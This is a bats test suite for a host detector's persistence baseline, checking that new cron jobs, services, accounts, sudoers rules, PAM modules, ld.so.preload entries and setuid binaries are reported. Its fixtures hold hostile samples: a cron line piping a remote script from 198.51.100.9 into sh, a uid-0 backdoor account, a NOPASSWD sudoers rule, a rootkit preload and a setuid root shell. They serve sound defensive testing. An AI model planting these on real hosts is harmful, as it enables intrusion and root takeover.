#!/usr/bin/env bats
# lib/baseline.sh: the persistence snapshot and what counts as a change.

setup() {
  load helper
  cerberus_setup
  cerberus_load
  fixture crontab_out ""
  fixture systemctl_unit_files "ssh.service enabled"
  fixture systemctl_units_running "ssh.service"
}

@test "the first diff seeds the baseline instead of alerting on everything" {
  run baseline_diff
  [[ "$output" != *"SOFT|persistence"* ]]
  [ -f "$BASELINE_DIR/units" ]
}

@test "a new root cron entry is reported once the baseline exists" {
  baseline_build
  fixture crontab_out "*/5 * * * * curl -s http://198.51.100.9/x | sh"

  run baseline_diff
  [[ "$output" == *"SOFT|persistence|-|new in crontab:"* ]]
  [[ "$output" == *"198.51.100.9"* ]]
}

@test "a new systemd unit is reported" {
  baseline_build
  fixture systemctl_unit_files "ssh.service enabled" "evil.service enabled"

  run baseline_diff
  [[ "$output" == *"new in units: evil.service enabled"* ]]
}

@test "a newly running service is reported" {
  baseline_build
  fixture systemctl_units_running "ssh.service" "kdevtmpfsi.service"

  run baseline_diff
  [[ "$output" == *"new in units_running: kdevtmpfsi.service"* ]]
}

@test "removals are not reported -- cleanup is not a threat signal" {
  fixture crontab_out "0 3 * * * /usr/local/bin/backup" "0 4 * * * /usr/local/bin/report"
  baseline_build
  fixture crontab_out "0 3 * * * /usr/local/bin/backup"

  run baseline_diff
  [ -z "$output" ]
}

@test "an unchanged host produces no findings at all" {
  baseline_build
  run baseline_diff
  [ -z "$output" ]
}

@test "baseline_build reseeds, so re-baselining silences a reviewed change" {
  baseline_build
  fixture crontab_out "*/5 * * * * /usr/local/bin/new-legit-job"
  run baseline_diff
  [[ "$output" == *"new in crontab"* ]]

  baseline_build            # operator reviewed it and accepted it
  run baseline_diff
  [ -z "$output" ]
}

@test "detect_persistence only runs every PERSISTENCE_EVERY passes" {
  baseline_build
  fixture crontab_out "*/5 * * * * /tmp/x"
  PERSISTENCE_EVERY=10

  CERBERUS_PASS=3 run detect_persistence
  [ -z "$output" ]
  CERBERUS_PASS=10 run detect_persistence
  [[ "$output" == *"new in crontab"* ]]
}

@test "detect_persistence is disabled by DETECT_PERSISTENCE=0" {
  baseline_build
  fixture crontab_out "*/5 * * * * /tmp/x"
  DETECT_PERSISTENCE=0 CERBERUS_PASS=0 run detect_persistence
  [ -z "$output" ]
}

@test "an existing ld.so.preload is captured, not printed as a finding" {
  # The capture writes to files; its stdout is the detector's finding stream.
  # A bare path leaking onto it would be parsed as SEVERITY|CATEGORY|PID|DETAIL.
  LD_PRELOAD_FILE="$TEST_TMP/ld.so.preload"
  printf '/lib/evil.so\n' > "$LD_PRELOAD_FILE"

  run _baseline_capture "$TEST_TMP/snap"
  [ -z "$output" ]
  run cat "$TEST_TMP/snap/ld_preload"
  [ "$output" = "/lib/evil.so" ]
}

@test "a new ld.so.preload entry is reported as persistence" {
  LD_PRELOAD_FILE="$TEST_TMP/ld.so.preload"
  : > "$LD_PRELOAD_FILE"
  baseline_build
  printf '/tmp/rootkit.so\n' > "$LD_PRELOAD_FILE"

  run baseline_diff
  [[ "$output" == *"new in ld_preload: /tmp/rootkit.so"* ]]
}

@test "no ld.so.preload on the host is not an error" {
  LD_PRELOAD_FILE="$TEST_TMP/absent"
  run _baseline_capture "$TEST_TMP/snap"
  [ -z "$output" ]
  [ -f "$TEST_TMP/snap/ld_preload" ]
  run cat "$TEST_TMP/snap/ld_preload"
  [ -z "$output" ]
}

# --- expanded persistence surface ------------------------------------------

@test "a new account is reported" {
  PASSWD_FILE="$TEST_TMP/passwd"
  printf 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n' \
    > "$PASSWD_FILE"
  baseline_build
  printf 'backup2:x:0:0:backup:/root:/bin/bash\n' >> "$PASSWD_FILE"

  run baseline_diff
  [[ "$output" == *"new in accounts: backup2:0:0"* ]]
}

@test "a new sudoers drop-in is reported with the file it came from" {
  SUDOERS_FILE="$TEST_TMP/sudoers"
  SUDOERS_DIR="$TEST_TMP/sudoers.d"
  mkdir -p "$SUDOERS_DIR"
  printf 'root ALL=(ALL:ALL) ALL\n' > "$SUDOERS_FILE"
  baseline_build
  printf 'www-data ALL=(ALL) NOPASSWD: ALL\n' > "$SUDOERS_DIR/99-www"

  run baseline_diff
  [[ "$output" == *"new in sudoers:"* ]]
  [[ "$output" == *"99-www"* ]]
  [[ "$output" == *"NOPASSWD"* ]]
}

@test "an sshd directive change is reported by name, not as a hash" {
  SSHD_CONFIG="$TEST_TMP/sshd_config"
  printf 'Port 22\nPermitRootLogin prohibit-password\n' > "$SSHD_CONFIG"
  baseline_build
  printf 'Port 22\nPermitRootLogin yes\n' > "$SSHD_CONFIG"

  run baseline_diff
  [[ "$output" == *"new in sshd_config: PermitRootLogin yes"* ]]
}

@test "a modified PAM module is reported" {
  PAM_DIR="$TEST_TMP/pam.d"
  mkdir -p "$PAM_DIR"
  printf 'auth required pam_unix.so\n' > "$PAM_DIR/sshd"
  baseline_build
  printf 'auth required pam_unix.so\nauth optional /lib/evil.so\n' > "$PAM_DIR/sshd"

  run baseline_diff
  [[ "$output" == *"new in pam:"* ]]
  [[ "$output" == *"$PAM_DIR/sshd"* ]]
}

@test "a new setuid binary is reported" {
  SETUID_DIRS="$TEST_TMP/scan"
  mkdir -p "$SETUID_DIRS"
  printf '#!/bin/sh\n' > "$SETUID_DIRS/ordinary"
  chmod 755 "$SETUID_DIRS/ordinary"
  baseline_build

  cp /bin/sh "$SETUID_DIRS/rootshell"
  chmod 4755 "$SETUID_DIRS/rootshell"

  run baseline_diff
  [[ "$output" == *"new in setuid:"* ]]
  [[ "$output" == *"rootshell"* ]]
}

@test "setuid scanning is skipped when DETECT_SETUID=0" {
  SETUID_DIRS="$TEST_TMP/scan"
  mkdir -p "$SETUID_DIRS"
  DETECT_SETUID=0 baseline_build
  cp /bin/sh "$SETUID_DIRS/rootshell"
  chmod 4755 "$SETUID_DIRS/rootshell"

  DETECT_SETUID=0 run baseline_diff
  [[ "$output" != *"setuid"* ]]
}

@test "dry run: the persistence baseline is not seeded" {
  rm -rf "$BASELINE_DIR"; mkdir -p "$BASELINE_DIR"
  DRY_RUN=1
  run baseline_diff
  [[ "$output" != *"SOFT|persistence"* ]]   # log() goes to stderr, findings to stdout
  [ ! -f "$BASELINE_DIR/units" ]
}
